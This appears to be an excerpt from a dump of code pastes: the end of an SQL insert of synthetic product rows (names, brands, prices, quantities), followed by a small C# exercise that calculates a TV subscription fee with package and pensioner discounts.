(1915,'Practical Metal Chair','Rolex','25870.00',164),
(5463,'Unbranded Concrete Chair','Rolex','492977.00',755),
(9847,'Handcrafted Steel Cheese','Unilever','985953.00',324),
(7777,'Electronic Concrete Cheese','Amazon','590472.00',851),
(3463,'Recycled Metal Keyboard','Mercedes','91589.00',992),
(3361,'Oriental Soft Ball','Uniqlo','191556.00',926),
(5592,'Rustic Cotton Fish','Uniqlo','164606.00',217),
(5624,'Handmade Granite Fish','Rolex','74184.00',463),
(2889,'Elegant Granite Chicken','Adobe','981026.00',982),
(6452,'Unbranded Steel Keyboard','Sony','952988.00',959),
(9886,'Incredible Fresh Sausages','Yamaha','188196.00',460),
(9027,'Incredible Soft Gloves','Adidas','981892.00',333),
(5752,'Intelligent Wooden Sausages','FedEx','407060.00',573),
(8532,'Tasty Rubber Shoes','ZTE','105552.00',289),
(3965,'Tasty Steel Bacon','Uniqlo','300272.00',178),
(2828,'Tasty Cotton Gloves','ZTE','979466.00',311),
(2231,'Oriental Soft Mouse','Lenovo','893190.00',616),
(5819,'Recycled Steel Soap','Philips','75756.00',827),
(5003,'Intelligent Granite Chicken','Adobe','435471.00',209),
(8465,'Refined Steel Chair','IBM','28301.00',357),
(4800,'Modern Granite Shoes','Toyota','144758.00',187),
(7362,'Generic Wooden Chair','Ferarri','379373.00',128),
(9595,'Elegant Fresh Hat','ZTE','645177.00',500),
(8930,'Ergonomic Concrete Computer','Yamaha','935346.00',143),
(4350,'Small Granite Shoes','IBM','532544.00',628),
(8428,'Gorgeous Wooden Fish','Robot','838723.00',210),
(7053,'Generic Frozen Towels','Microsoft','804574.00',518),
(2232,'Ergonomic Plastic Mouse','Ferarri','630890.00',465),
(2316,'Rustic Concrete Car','Nvidia','796870.00',959),
(6160,'Luxurious Cotton Salad','Adobe','259524.00',855),
(4759,'Sleek Frozen Ball','Intel','873706.00',446),
(2276,'Generic Frozen Car','Alienware','501499.00',316),
(9547,'Practical Metal Chair','FedEx','120907.00',336),
(3888,'Handcrafted Fresh Pants','Amazon','593540.00',142),
(8173,'Bespoke Steel Bike','Pepsodent','24946.00',403),
(3176,'Rustic Plastic Fish','Sony','140985.00',397),
(5440,'Recycled Fresh Computer','Lamborghini','160961.00',300),
(7215,'Intelligent Frozen Chips','Hyundai','100372.00',793),
(6961,'Handcrafted Granite Computer','Gucci','871239.00',722),
(8552,'Sleek Rubber Tuna','Vans','247339.00',244),
(8933,'Recycled Metal Gloves','Suzuki','210403.00',522),
(8016,'Elegant Wooden Sausages','Acer','54092.00',820),
(8818,'Refined Plastic Bike','Nvidia','137575.00',769),
(6206,'Handcrafted Plastic Mouse','Crocs','429978.00',901),
(4035,'Handmade Frozen Car','Logitech','302060.00',279),
(8532,'Licensed Granite Pants','Disney','174557.00',239),
(4206,'Rustic Fresh Computer','Toshiba','705568.00',386),
(1409,'Licensed Concrete Keyboard','Yamaha','710765.00',296),
(7410,'Unbranded Frozen Keyboard','Unilever','326145.00',579),
(7664,'Luxurious Steel Pants','HBO','697420.00',690),
(5241,'Elegant Cotton Fish','Lamborghini','793952.00',821),
(6693,'Recycled Plastic Shoes','Hyundai','84306.00',273),
(8581,'Incredible Plastic Pizza','Chanel','857278.00',760),
(9266,'Handcrafted Bronze Ball','Chanel','830488.00',245),
(7617,'Sleek Concrete Fish','Vans','185075.00',582),
(5326,'Small Concrete Chips','Acer','578663.00',977),
(4902,'Handcrafted Wooden Pants','Rolex','525541.00',246),
(3570,'Gorgeous Cotton Cheese','ZTE','128266.00',873),
(5483,'Awesome Wooden Keyboard','Yamaha','614616.00',842),
(5957,'Sleek Soft Ball','Vans','339312.00',764),
(4210,'Fantastic Granite Chips','Ferarri','602486.00',505),
(8325,'Tasty Cotton Shoes','Vans','816683.00',876),
(7773,'Generic Cotton Sausages','Nike','66042.00',475),
(8081,'Bespoke Frozen Chicken','Nvidia','752883.00',746),
(7074,'Intelligent Granite Bike','Chanel','601323.00',524),
(7234,'Licensed Plastic Car','Adidas','812529.00',812),
(3841,'Tasty Bronze Cheese','Sony','367099.00',612),
(1176,'Luxurious Metal Chips','Toshiba','539049.00',759),
(6225,'Incredible Granite Shirt','Lamborghini','335449.00',935),
(8233,'Handcrafted Steel Hat','Porsche','400678.00',784),
(1932,'Generic Soft Salad','Philips','464459.00',736),
(1018,'Luxurious Granite Pizza','Nokia','475512.00',874),
(5278,'Tasty Bronze Bike','Asus','671248.00',943),
(9600,'Small Fresh Table','Intel','393130.00',539),
(3670,'Oriental Soft Chips','Alienware','247227.00',424),
(6483,'Elegant Rubber Bike','Robot','390817.00',968),
(6801,'Oriental Frozen Table','Polytron','718126.00',321),
(2314,'Tasty Soft Shoes','Robot','204639.00',311),
(1030,'Intelligent Steel Gloves','Lamborghini','169694.00',380),
(2827,'Ergonomic Frozen Bacon','Sharp','163291.00',280),
(6806,'Intelligent Soft Ball','Microsoft','886447.00',210),
(8835,'Gorgeous Rubber Chicken','Sharp','377672.00',586),
(2462,'Incredible Plastic Sausages','Uniqlo','95593.00',178),
(4024,'Unbranded Frozen Shoes','3M','620820.00',446),
(5655,'Unbranded Bronze Hat','Sharp','543492.00',834),
(9298,'Luxurious Wooden Fish','HBO','114496.00',898),
(2606,'Elegant Soft Gloves','HBO','315450.00',371),
(1759,'Awesome Granite Sausages','Vans','426813.00',299),
(7227,'Electronic Metal Cheese','Mitsubishi','973820.00',677),
(8405,'Fantastic Fresh Hat','Mitsubishi','647482.00',441),
(4792,'Licensed Plastic Cheese','Logitech','991350.00',543),
(1292,'Practical Fresh Mouse','Amazon','365785.00',221),
(3850,'Modern Frozen Fish','Sony','333257.00',906),
(7713,'Licensed Fresh Chair','Kawasaki','723455.00',243),
(6984,'Ergonomic Metal Hat','Vans','946067.00',754),
(7755,'Electronic Rubber Computer','Uber','647899.00',423),
(1934,'Rustic Cotton Car','Gucci','363058.00',860),
(8484,'Awesome Soft Hat','Kawasaki','882366.00',157),
(7649,'Handcrafted Bronze Keyboard','Gucci','653634.00',825),
(8213,'Fantastic Frozen Keyboard','Amazon','263474.00',612),
(6182,'Tasty Concrete Salad','Mercedes','743579.00',689),
(3365,'Electronic Granite Salad','Alienware','965802.00',327),
(2173,'Generic Cotton Computer','Philips','247399.00',799),
(9378,'Handmade Concrete Mouse','Audi','840213.00',470),
(9149,'Small Fresh Bacon','Vans','973345.00',117),
(1872,'Ergonomic Plastic Pants','Mercedes','334875.00',310),
(8295,'Recycled Concrete Pants','Motorola','760191.00',671),
(4723,'Unbranded Cotton Shirt','Toshiba','926173.00',724),
(8796,'Gorgeous Frozen Fish','Vans','891214.00',808),
(6908,'Fantastic Plastic Computer','Motorola','30890.00',839),
(8501,'Awesome Steel Chicken','3M','181137.00',709),
(8476,'Awesome Rubber Keyboard','Sharp','475795.00',859),
(7132,'Sleek Soft Bike','Vans','46339.00',320),
(4812,'Refined Granite Fish','Ferarri','484862.00',596),
(8051,'Licensed Cotton Shirt','Chanel','149142.00',568),
(4601,'Unbranded Frozen Chicken','Rolex','328196.00',401),
(9247,'Generic Cotton Shoes','Vans','806666.00',667),
(7244,'Small Metal Sausages','Yamaha','191827.00',981),
(5009,'Sleek Concrete Pants','HBO','100029.00',442),
(2992,'Bespoke Bronze Chicken','Ferarri','779835.00',189),
(9327,'Ergonomic Concrete Hat','Vans','300467.00',534),
(6032,'Handmade Metal Bike','Disney','204176.00',584),
(4223,'Refined Fresh Shirt','Asus','754869.00',972),
(6012,'Luxurious Rubber Chips','AMD','242695.00',901),
(1505,'Licensed Rubber Tuna','Chanel','722451.00',332),
(4374,'Electronic Frozen Pizza','Huawei','692465.00',283),
(2924,'Ergonomic Granite Hat','Amazon','657381.00',273),
(2779,'Modern Wooden Towels','Chanel','31097.00',650),
(1336,'Generic Cotton Pizza','Motorola','408358.00',366),
(8917,'Bespoke Plastic Chair','Audi','327455.00',147),
(9993,'Rustic Frozen Cheese','HBO','627832.00',155),
(1344,'Licensed Bronze Shirt','FedEx','351653.00',490),
(3332,'Handcrafted Rubber Towels','Logitech','672831.00',258),
(6739,'Bespoke Soft Pants','Disney','666695.00',129),
(4463,'Incredible Metal Table','Logitech','161473.00',373),
(1946,'Modern Soft Tuna','Vans','183059.00',589),
(9814,'Intelligent Rubber Hat','3M','215073.00',621),
(3792,'Elegant Soft Cheese','Suzuki','449344.00',986),
(6641,'Handcrafted Cotton Shirt','Sony','874848.00',275),
(9935,'Electronic Plastic Tuna','Amazon','524033.00',850),
(2159,'Rustic Granite Ball','Unilever','397266.00',735),
(3159,'Small Soft Cheese','Tesla','447081.00',542),
(2509,'Rustic Plastic Gloves','Ferarri','699607.00',370),
(2785,'Awesome Cotton Pizza','Disney','830872.00',496),
(5065,'Rustic Granite Pants','Robot','921983.00',659),
(4548,'Recycled Concrete Sausages','Gucci','383224.00',625),
(7961,'Generic Concrete Shirt','Nike','625039.00',862),
(5807,'Fantastic Wooden Shoes','Xiaomi','524276.00',266),
(9181,'Sleek Metal Fish','Ferarri','325260.00',318),
(3774,'Licensed Granite Shirt','IBM','259575.00',252),
(8426,'Gorgeous Wooden Cheese','Adobe','555687.00',840),
(7811,'Elegant Steel Chicken','HTC','608108.00',495),
(8969,'Recycled Plastic Shoes','Crocs','228136.00',394),
(8904,'Electronic Granite Shoes','Nike','913218.00',613),
(8046,'Oriental Cotton Gloves','Alienware','753267.00',665),
(7559,'Ergonomic Plastic Car','Pepsodent','810681.00',837),
(2267,'Bespoke Plastic Salad','Polytron','251089.00',592),
(9178,'Tasty Plastic Chicken','Huawei','502462.00',591),
(6671,'Awesome Steel Gloves','Audi','78166.00',850),
(4963,'Incredible Fresh Tuna','Huawei','784553.00',314),
(2007,'Oriental Concrete Mouse','Tesla','968827.00',105),
(1284,'Practical Bronze Keyboard','Nike','743099.00',297),
(7999,'Luxurious Bronze Shoes','Mercedes','342272.00',864),
(2820,'Refined Fresh Computer','Nvidia','956308.00',960),
(9646,'Ergonomic Steel Tuna','Toyota','666278.00',278),
(2333,'Rustic Rubber Car','Vans','131683.00',281),
(1121,'Tasty Metal Chips','FedEx','732673.00',326),
(6502,'Gorgeous Plastic Pants','Uber','133387.00',394),
(3508,'Oriental Plastic Pizza','Nike','584039.00',865),
(2022,'Generic Bronze Soap','Microsoft','345877.00',690),
(3019,'Oriental Metal Bacon','Adidas','985175.00',801),
(7367,'Luxurious Cotton Bacon','Nintendo','980346.00',283),
(1734,'Rustic Granite Cheese','ZTE','128727.00',321),
(5110,'Small Wooden Table','Intel','459209.00',248),
(8784,'Bespoke Wooden Ball','Huawei','366842.00',472),
(7149,'Tasty Bronze Pizza','Uniqlo','575289.00',390),
(4331,'Electronic Fresh Towels','IBM','619992.00',959),
(1793,'Ergonomic Frozen Soap','Sony','456504.00',467),
(5977,'Modern Bronze Table','Nvidia','82602.00',435),
(2218,'Sleek Concrete Salad','FedEx','825532.00',643),
(4779,'Ergonomic Frozen Car','Suzuki','474283.00',492),
(9249,'Licensed Bronze Cheese','Alienware','849259.00',685),
(9033,'Refined Granite Ball','Motorola','134248.00',386),
(7250,'Oriental Frozen Shirt','Alienware','383975.00',216),
(4721,'Luxurious Soft Pizza','Nvidia','824003.00',335),
(4749,'Rustic Concrete Pants','Uber','289371.00',853),
(8871,'Tasty Frozen Hat','Audi','435655.00',965),
(5585,'Fantastic Concrete Hat','Vans','55985.00',841),
(4436,'Tasty Wooden Chair','Amazon','555002.00',679),
(3372,'Generic Steel Towels','Crocs','339169.00',848),
(9202,'Modern Steel Cheese','Nike','467523.00',240),
(1041,'Licensed Soft Bike','Polytron','56139.00',221),
(4761,'Recycled Soft Mouse','Disney','182206.00',406),
(5700,'Ergonomic Metal Shirt','Adobe','236690.00',491),
(8882,'Gorgeous Concrete Towels','Suzuki','157057.00',263),
(1458,'Handmade Fresh Computer','Unilever','840709.00',328),
(3168,'Practical Frozen Hat','Gucci','977648.00',925),
(3977,'Elegant Soft Mouse','Vans','972788.00',751),
(6183,'Sleek Rubber Chips','Logitech','637223.00',942),
(6598,'Bespoke Steel Pizza','Pepsodent','915306.00',393),
(6002,'Fantastic Fresh Car','Uniqlo','143021.00',280),
(7948,'Electronic Frozen Tuna','Nvidia','210257.00',709),
(2947,'Generic Rubber Pants','Alienware','898825.00',546),
(8189,'Ergonomic Steel Chips','Huawei','583820.00',279),
(1903,'Oriental Bronze Table','Kawasaki','988914.00',847),
(4021,'Electronic Metal Sausages','Gucci','777576.00',145),
(7219,'Gorgeous Cotton Ball','Aisan','667629.00',454),
(9043,'Rustic Metal Chair','Apple','898492.00',885),
(7683,'Fantastic Plastic Computer','Polytron','763008.00',311),
(2800,'Luxurious Rubber Chips','Ferarri','141272.00',940),
(3156,'Licensed Metal Keyboard','Apple','438450.00',979),
(3534,'Practical Fresh Salad','HBO','153693.00',227),
(1380,'Tasty Steel Chips','AMD','890968.00',954),
(4307,'Ergonomic Metal Shoes','Pepsodent','716611.00',404),
(9447,'Luxurious Granite Gloves','Acer','427654.00',748),
(6357,'Small Soft Salad','Toyota','933940.00',225),
(4125,'Intelligent Fresh Towels','Asus','657875.00',678),
(6912,'Elegant Bronze Gloves','Adobe','730528.00',270),
(9208,'Tasty Wooden Salad','Logitech','773776.00',681),
(8309,'Generic Concrete Bacon','Lenovo','352469.00',980),
(5844,'Licensed Cotton Shirt','Unilever','591735.00',414),
(8576,'Gorgeous Concrete Tuna','Lamborghini','533836.00',415),
(7671,'Practical Wooden Mouse','AMD','225227.00',912),
(7599,'Generic Frozen Ball','Aisan','41998.00',807),
(7315,'Luxurious Bronze Ball','Nokia','781836.00',864),
(4556,'Handcrafted Soft Shirt','Audi','76022.00',994),
(5163,'Recycled Plastic Chair','Logitech','976957.00',310),
(2607,'Sleek Steel Mouse','Unilever','991514.00',160),
(3495,'Licensed Fresh Salad','Tesla','159276.00',775),
(1703,'Unbranded Cotton Tuna','Asus','871310.00',525),
(4565,'Handcrafted Granite Ball','Lenovo','26541.00',154),
(3221,'Small Bronze Keyboard','Unilever','221507.00',182),
(6536,'Oriental Steel Chicken','Vans','851031.00',789),
(5708,'Tasty Concrete Bike','Apple','887851.00',812),
(5570,'Oriental Steel Hat','Intel','742831.00',312),
(7105,'Licensed Granite Chair','Vans','179101.00',757),
(5321,'Electronic Rubber Towels','Nike','756233.00',995),
(5157,'Rustic Wooden Pants','Nvidia','924302.00',116),
(9281,'Small Fresh Computer','Adobe','264354.00',316),
(9852,'Practical Fresh Chips','Crocs','725695.00',396),
(5575,'Handmade Fresh Bacon','Uber','823665.00',515),
(1024,'Handmade Metal Computer','Nvidia','372081.00',734),
(1082,'Ergonomic Concrete Chair','Logitech','231860.00',896),
(5227,'Electronic Soft Gloves','Alienware','635681.00',314),
(6984,'Rustic Steel Keyboard','Porsche','52786.00',541),
(9499,'Incredible Fresh Car','Yamaha','705015.00',451),
(2585,'Bespoke Rubber Bacon','Uber','752176.00',808),
(5493,'Recycled Steel Towels','Nintendo','927442.00',713),
(3207,'Modern Concrete Shoes','Logitech','735480.00',311),
(2256,'Modern Steel Gloves','Hyundai','373757.00',829),
(9921,'Practical Concrete Gloves','Disney','109209.00',737),
(8491,'Tasty Frozen Computer','Mercedes','191474.00',343),
(3989,'Elegant Fresh Soap','Chanel','111795.00',919),
(4724,'Electronic Fresh Car','Chanel','791932.00',421),
(1753,'Modern Wooden Shoes','Aisan','454134.00',648),
(6028,'Handcrafted Granite Pizza','IBM','580528.00',908),
(3105,'Gorgeous Cotton Tuna','Chanel','846704.00',265),
(6552,'Gorgeous Soft Ball','Gucci','455514.00',962),
(1058,'Intelligent Plastic Shoes','Yamaha','663558.00',171),
(3514,'Refined Soft Gloves','Vans','675857.00',396),
(8174,'Oriental Cotton Shirt','Chanel','203745.00',481),
(3853,'Gorgeous Frozen Mouse','Nintendo','660683.00',290),
(3026,'Luxurious Concrete Chips','Gucci','542034.00',924),
(6485,'Intelligent Steel Shoes','ZTE','904428.00',904),
(8374,'Refined Plastic Keyboard','Microsoft','449748.00',148),
(5105,'Fantastic Rubber Tuna','Lenovo','647646.00',935),
(5951,'Incredible Bronze Hat','Amazon','933257.00',709),
(9425,'Luxurious Cotton Chips','Polytron','594977.00',321),
(2969,'Ergonomic Rubber Keyboard','Lamborghini','333437.00',996),
(4632,'Recycled Soft Car','FedEx','847538.00',463),
(7167,'Elegant Concrete Shoes','Uber','464581.00',868),
(2452,'Recycled Soft Chicken','Microsoft','748125.00',953),
(3735,'Gorgeous Granite Bacon','Mitsubishi','110186.00',631),
(1901,'Licensed Wooden Sausages','AMD','388620.00',237),
(9712,'Licensed Concrete Tuna','Adidas','312135.00',529),
(8068,'Fantastic Wooden Car','Suzuki','651299.00',927),
(6413,'Elegant Wooden Mouse','Nvidia','398618.00',710),
(9596,'Refined Steel Cheese','Nike','282846.00',442),
(8462,'Small Soft Chicken','Chanel','323904.00',573),
(9766,'Unbranded Concrete Bike','Robot','597822.00',450),
(7663,'Licensed Concrete Shirt','HTC','158965.00',147),
(7840,'Rustic Bronze Table','Huawei','202251.00',849),
(8659,'Bespoke Frozen Cheese','Unilever','695331.00',351),
(3702,'Oriental Concrete Bacon','Acer','241891.00',590),
(8580,'Bespoke Rubber Ball','HBO','52342.00',402),
(9796,'Bespoke Concrete Pizza','Vans','202815.00',581),
(8937,'Handcrafted Plastic Tuna','Nike','565584.00',630),
(5145,'Handmade Rubber Soap','Vans','879073.00',876),
(6648,'Recycled Concrete Salad','Huawei','460469.00',467),
(4843,'Modern Plastic Computer','Nike','423685.00',168),
(5379,'Elegant Plastic Keyboard','Disney','18074.00',295),
(8487,'Recycled Soft Fish','Nintendo','958969.00',102),
(3225,'Awesome Fresh Pants','Lenovo','865613.00',691),
(1376,'Ergonomic Concrete Bike','Crocs','319180.00',588),
(4435,'Elegant Soft Shirt','Crocs','959850.00',527),
(1326,'Unbranded Frozen Gloves','Asus','342946.00',376),
(5878,'Bespoke Wooden Fish','FedEx','840605.00',880),
(6690,'Unbranded Concrete Pizza','Intel','780490.00',893),
(5335,'Sleek Plastic Pizza','Hyundai','457984.00',300),
(5953,'Rustic Concrete Towels','Chanel','890159.00',472),
(1943,'Awesome Concrete Shirt','Motorola','897902.00',913),
(5167,'Sleek Bronze Ball','IBM','844624.00',993),
(3508,'Handmade Metal Ball','Intel','445739.00',970),
(4667,'Tasty Cotton Bike','Pepsodent','739466.00',293),
(5665,'Small Steel Mouse','Asus','101483.00',467),
(3088,'Oriental Soft Soap','Adidas','696949.00',839),
(6986,'Electronic Soft Computer','3M','513208.00',128),
(2611,'Luxurious Frozen Shirt','Lamborghini','699747.00',945),
(6384,'Awesome Steel Pants','Nokia','494223.00',646),
(3341,'Incredible Concrete Ball','Xiaomi','486861.00',766),
(6169,'Elegant Cotton Salad','Pepsodent','104896.00',500),
(1716,'Fantastic Fresh Mouse','Suzuki','377745.00',233),
(3721,'Sleek Wooden Bike','Adobe','61359.00',161),
(3404,'Awesome Metal Table','Uniqlo','63637.00',850),
(5557,'Luxurious Rubber Pizza','Vans','171698.00',990),
(4279,'Bespoke Bronze Mouse','HTC','460458.00',457),
(6508,'Ergonomic Wooden Keyboard','Yamaha','244607.00',636),
(5398,'Intelligent Bronze Pants','FedEx','591000.00',526),
(1122,'Ergonomic Plastic Chair','HBO','359568.00',306),
(6920,'Elegant Granite Tuna','Intel','343013.00',562),
(4807,'Sleek Soft Car','HTC','706920.00',293),
(8529,'Elegant Bronze Hat','Vans','183077.00',329),
(8398,'Awesome Concrete Pizza','Pepsodent','968047.00',579),
(5660,'Small Wooden Ball','Mitsubishi','743259.00',352),
(4825,'Modern Bronze Pants','Huawei','172655.00',850),
(8776,'Recycled Frozen Salad','Xiaomi','831247.00',902),
(2304,'Luxurious Plastic Shoes','ZTE','271077.00',711),
(9321,'Modern Plastic Car','Huawei','305116.00',779),
(1171,'Tasty Bronze Shoes','Disney','347403.00',133),
(9371,'Gorgeous Wooden Chicken','Nintendo','830574.00',657),
(4257,'Gorgeous Bronze Computer','Ferarri','587230.00',398),
(5183,'Sleek Steel Keyboard','Chanel','475884.00',360),
(8958,'Awesome Fresh Salad','Logitech','615199.00',954),
(6279,'Awesome Frozen Shirt','Crocs','964077.00',956),
(2427,'Sleek Fresh Tuna','Lenovo','433559.00',232),
(2583,'Luxurious Granite Chair','ZTE','28021.00',778),
(3023,'Elegant Cotton Soap','Sharp','113625.00',935),
(2286,'Refined Frozen Soap','Sharp','271498.00',932),
(3556,'Intelligent Bronze Sausages','Huawei','506083.00',248),
(9040,'Refined Frozen Bacon','FedEx','938878.00',886),
(1481,'Practical Rubber Table','Audi','761906.00',941),
(6843,'Unbranded Bronze Pants','Alienware','133305.00',990),
(5251,'Elegant Concrete Hat','HBO','356744.00',297),
(3659,'Generic Granite Car','Nintendo','763495.00',492),
(3484,'Luxurious Steel Gloves','Lamborghini','802254.00',803),
(6697,'Handcrafted Granite Chicken','IBM','740424.00',147),
(4882,'Elegant Concrete Pants','Nintendo','415841.00',108),
(6385,'Gorgeous Fresh Hat','Suzuki','500044.00',286),
(4459,'Small Plastic Chips','Alienware','828174.00',495),
(3399,'Small Concrete Fish','Nokia','53566.00',131),
(7178,'Oriental Metal Bike','Samsung','76567.00',269),
(7989,'Incredible Fresh Fish','Nike','710081.00',645),
(7751,'Practical Plastic Computer','Aisan','435658.00',810),
(7063,'Sleek Steel Car','Hyundai','636450.00',562),
(4212,'Recycled Steel Towels','Yamaha','655866.00',545),
(7731,'Refined Steel Table','Suzuki','260561.00',223),
(6228,'Sleek Cotton Bike','Logitech','863677.00',651),
(5437,'Handmade Fresh Shoes','FedEx','806190.00',181),
(4650,'Small Granite Table','Lenovo','586036.00',280),
(8701,'Refined Wooden Cheese','Polytron','728056.00',963),
(4373,'Awesome Granite Mouse','Vans','643102.00',359),
(3055,'Electronic Wooden Gloves','Motorola','40171.00',170),
(7329,'Tasty Fresh Gloves','Ferarri','524304.00',949),
(3818,'Gorgeous Granite Chicken','Chanel','391847.00',238),
(3944,'Bespoke Plastic Car','Unilever','70814.00',905),
(8139,'Electronic Wooden Salad','Apple','613603.00',676),
(6066,'Fantastic Steel Car','Acer','380807.00',500),
(5425,'Incredible Steel Shoes','Robot','397894.00',561),
(3131,'Intelligent Steel Hat','Lenovo','168264.00',886),
(1271,'Sleek Steel Towels','Ferarri','159743.00',403),
(6248,'Incredible Wooden Cheese','ZTE','338301.00',928),
(7859,'Electronic Bronze Mouse','Vans','595429.00',400),
(6182,'Rustic Cotton Fish','Philips','294984.00',503),
(7972,'Handmade Granite Bike','AMD','469314.00',932),
(8271,'Modern Rubber Computer','Pepsodent','906340.00',388),
(2467,'Sleek Steel Bacon','Robot','42220.00',936),
(8510,'Gorgeous Plastic Shirt','Ferarri','754024.00',322),
(4282,'Ergonomic Wooden Salad','Lamborghini','353516.00',299),
(4980,'Recycled Steel Car','Uber','637573.00',520),
(4395,'Rustic Bronze Fish','Sharp','833790.00',661),
(5606,'Elegant Frozen Shirt','Suzuki','719394.00',701),
(9927,'Generic Bronze Sausages','Lenovo','693921.00',774),
(6470,'Intelligent Bronze Towels','Nintendo','896208.00',331),
(6922,'Generic Soft Bacon','Sharp','352060.00',198),
(8227,'Practical Metal Pizza','Alienware','422361.00',977),
(1991,'Small Granite Computer','Porsche','556977.00',815),
(7669,'Bespoke Rubber Gloves','Rolex','65396.00',978),
(9198,'Awesome Frozen Bacon','Toshiba','429108.00',518),
(1632,'Incredible Plastic Towels','Porsche','716104.00',345),
(5303,'Electronic Granite Pants','Yamaha','926722.00',373),
(9547,'Elegant Metal Chicken','Uniqlo','712089.00',176),
(6151,'Licensed Cotton Pizza','Robot','467777.00',152),
(4720,'Bespoke Soft Salad','Tesla','702068.00',114),
(6262,'Electronic Metal Chips','Uber','292997.00',593),
(5145,'Tasty Wooden Towels','Amazon','946432.00',913),
(2611,'Gorgeous Bronze Sausages','Microsoft','644563.00',701),
(9038,'Sleek Fresh Hat','Nintendo','827407.00',364),
(2598,'Electronic Bronze Bike','Ferarri','262902.00',612),
(2395,'Practical Wooden Soap','Acer','112630.00',335),
(4581,'Recycled Fresh Shirt','AMD','225014.00',835),
(6563,'Handcrafted Plastic Sausages','Lamborghini','893142.00',803);
"
ugqPCyzK,CorrectCode,Anonim_999,C#,Saturday 4th of May 2024 01:13:47 AM CDT,"using System;

namespace Ticket13
{
    public class Teleradio
    {
        public enum TVPack { Эконом, Мини, Универсал }

        public static int AbonentPayment(TVPack chanelNums, bool subscription, bool pensioner)
        {
            double payment = (subscription) ? 300 : 0;

            switch (chanelNums)
            {
                case TVPack.Эконом:
                    payment += 100;
                    break;
                case TVPack.Мини:
                    payment -= 200;
                    break;
                case TVPack.Универсал:
                    payment += 500;
                    break;
                default:
                    break;
            }

            if (pensioner)
                payment *= 0.9;
            if (payment < 0)
                payment = 0;
            return (int)Math.Round(payment);
        }
    }
}
"
